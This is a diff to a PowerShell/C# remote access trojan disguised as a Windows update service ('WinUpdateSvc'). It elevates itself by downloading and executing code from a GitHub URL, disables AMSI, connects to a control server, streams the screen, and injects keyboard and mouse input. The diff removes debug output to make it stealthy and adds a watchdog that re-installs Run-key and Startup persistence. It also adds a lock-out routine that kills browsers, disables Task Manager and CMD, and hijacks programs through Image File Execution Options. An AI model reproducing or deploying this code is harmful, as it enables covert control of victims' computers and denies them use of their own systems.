@@ -3,25 +3,17 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-Write-Host "[1] Iniciando..." -ForegroundColor Yellow
-
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    Write-Host "[!] Pedindo Admin..." -ForegroundColor Cyan
     try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
     exit
 }
-Write-Host "[2] Admin OK." -ForegroundColor Green
 
-# Não vamos nos esconder neste teste para podermos ver os logs
-# Se for a primeira execução (tela aberta), prepara o ambiente e NÃO esconde
+$dir = "$env:ProgramData\Microsoft\Windows\Caches"
+$scriptPath = "$dir\$installName.ps1"
+$vbsPath = "$dir\$installName.vbs"
+
 if ($args -notcontains "-silent") {
-    Write-Host "[3] Preparando para rodar visível..." -ForegroundColor Yellow
-} else {
-    $dir = "$env:ProgramData\Microsoft\Windows\Caches"
-    $scriptPath = "$dir\$installName.ps1"
-    $vbsPath = "$dir\$installName.vbs"
-
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
     
@@ -50,14 +42,15 @@ if ($args -notcontains "-silent") {
     
     attrib +h +s +r $scriptPath 2>$null
     attrib +h +s +r $vbsPath 2>$null
+    
+    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
+    exit
 }
 
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
-Write-Host "[3] AMSI Bypass OK." -ForegroundColor Green
 
 if (-not ("R9KAgent" -as [type])) {
-    Write-Host "[4] Compilando C#..." -ForegroundColor Yellow
     Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
     using System;
     using System.Drawing;
@@ -88,18 +81,17 @@ if (-not ("R9KAgent" -as [type])) {
         
         static Form bannerForm = null;
         static Thread bannerThread = null;
-        static StreamWriter globalWriter = null;
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
             try { SetProcessDPIAware(); } catch {}
             
-            Thread tInput = new Thread(InputLoop); tInput.Priority = ThreadPriority.Highest; tInput.IsBackground = true; tInput.Start();
+            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
+            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
 
             while (true) {
                 TcpClient myClient = null;
                 try {
-                    Console.WriteLine("[C#] Conectando ao controle...");
                     myClient = new TcpClient();
                     myClient.Connect(IP, PORT);
                     myClient.NoDelay = true;
@@ -107,23 +99,54 @@ if (-not ("R9KAgent" -as [type])) {
                     StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                     StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                     myWriter.AutoFlush = true;
-                    globalWriter = myWriter;
 
-                    Console.WriteLine("[C#] CONECTOU! Enviando BANNER...");
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
 
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
 
                     while (myClient.Connected) { Thread.Sleep(500); }
-                } catch (Exception ex) { 
-                    Console.WriteLine("[C#] Erro: " + ex.Message);
+                } catch { 
                     Thread.Sleep(3000); 
                 } finally {
                     streaming = false;
-                    globalWriter = null;
                     try { if (myClient != null) myClient.Close(); } catch {}
                 }
+            }
+        }
+
+        static void WatchdogLoop() {
+            string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
+            string scriptPath = dir + @"\WinUpdateSvc.ps1";
+            string vbsPath = dir + @"\WinUpdateSvc.vbs";
+            
+            while (true) {
+                try {
+                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
+                    if (!File.Exists(scriptPath)) {
+                        string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
+                        using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
+                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
+                    }
+                    if (!File.Exists(vbsPath)) {
+                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
+                        File.WriteAllText(vbsPath, vbs);
+                        File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
+                    }
+                    string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
+                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
+                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
+                    }
+                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
+                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
+                    }
+                    string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                    string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
+                    if (!File.Exists(startupVbs)) {
+                        try { File.Copy(vbsPath, startupVbs, true); File.SetAttributes(startupVbs, FileAttributes.Hidden | FileAttributes.System); } catch {}
+                    }
+                } catch {}
+                Thread.Sleep(5000);
             }
         }
 
@@ -147,7 +170,7 @@ if (-not ("R9KAgent" -as [type])) {
                         if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                     }
                 } catch {}
-                Thread.Sleep(1);
+                Thread.Sleep(5);
             }
         }
 
@@ -155,7 +178,6 @@ if (-not ("R9KAgent" -as [type])) {
             while (myClient.Connected) {
                 try {
                     if (streaming && myClient.Connected) {
-                        Console.WriteLine("[C#] Enviando frame de tela...");
                         string b64 = CaptureScreen(1280, 35);
                         if (b64 != null) {
                             lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
@@ -177,14 +199,13 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
-                Console.WriteLine("[C#] Comando: " + cmd);
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
                 if (cmd == "reinstall") {
-                    string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
+                    string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
                     try {
-                        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"");
+                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c timeout /t 2 /nobreak >nul && wscript.exe //B //Nologo \"" + vbsPath + "\"");
                         psi.WindowStyle = ProcessWindowStyle.Hidden;
                         psi.CreateNoWindow = true;
                         Process.Start(psi);
@@ -246,9 +267,26 @@ if (-not ("R9KAgent" -as [type])) {
 
                 if (cmd == "uninstall") { 
                     BlockInput(false); 
+                    UnblockAllApps();
+                    try {
+                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
+                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
+                        Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
+                        string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                        string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
+                        if (File.Exists(startupVbs)) { File.SetAttributes(startupVbs, FileAttributes.Normal); File.Delete(startupVbs); }
+                        
+                        string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
+                        string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
+                        if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
+                        if (File.Exists(vbsPath)) { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); }
+                    } catch {}
                     Environment.Exit(0); 
                 }
                 
+                if (cmd == "block_apps") { BlockAllApps(); lock(writeLock) { myWriter.WriteLine("APPS_BLOQUEADOS"); } return; }
+                if (cmd == "unblock_apps") { UnblockAllApps(); lock(writeLock) { myWriter.WriteLine("APPS_DESBLOQUEADOS"); } return; }
+
                 if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
                 if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
                 if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
@@ -270,6 +308,66 @@ if (-not ("R9KAgent" -as [type])) {
                 else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                 else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
             } catch {}
+        }
+
+        static void BlockAllApps() {
+            try { Process.Start("taskkill", "/F /IM explorer.exe").WaitForExit(); } catch {}
+            string[] browsers = { "chrome", "msedge", "firefox", "opera", "brave" };
+            foreach(var b in browsers) { try { Process.Start("taskkill", "/F /IM " + b + ".exe").WaitForExit(); } catch {} }
+
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")) {
+                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
+                key.SetValue("NoRun", 1, RegistryValueKind.DWord);
+                key.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
+            }
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System")) {
+                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
+            }
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System")) {
+                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
+            }
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System")) {
+                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
+            }
+
+            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
+            foreach (var app in apps) {
+                try {
+                    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app)) {
+                        key.SetValue("Debugger", "svchost.exe");
+                    }
+                } catch {}
+            }
+        }
+
+        static void UnblockAllApps() {
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true)) {
+                if (key != null) {
+                    key.DeleteValue("NoViewOnDrive", false);
+                    key.DeleteValue("NoRun", false);
+                    key.DeleteValue("NoDesktop", false);
+                }
+            }
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
+                if (key != null) {
+                    key.DeleteValue("DisableTaskMgr", false);
+                    key.DeleteValue("DisableRegistryTools", false);
+                }
+            }
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true)) {
+                if (key != null) key.DeleteValue("DisableCMD", false);
+            }
+            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true)) {
+                if (key != null) key.DeleteValue("DisableCMD", false);
+            }
+
+            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
+            foreach (var app in apps) {
+                try { Registry.LocalMachine.DeleteSubKeyTree(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app, false); } catch {}
+            }
+
+            try { Process.Start("explorer.exe"); } catch {}
         }
 
         static string CaptureScreen(int maxW, long quality) {
@@ -303,8 +401,6 @@ if (-not ("R9KAgent" -as [type])) {
         }
     }
 "@
-    Write-Host "[4.1] C# Compilado com sucesso!" -ForegroundColor Green
 }
 
-Write-Host "[5] Chamando Agente (Janela vai fechar se não for o modo debug)..." -ForegroundColor Cyan
 [R9KAgent]::Start($serverIP, $serverPort)
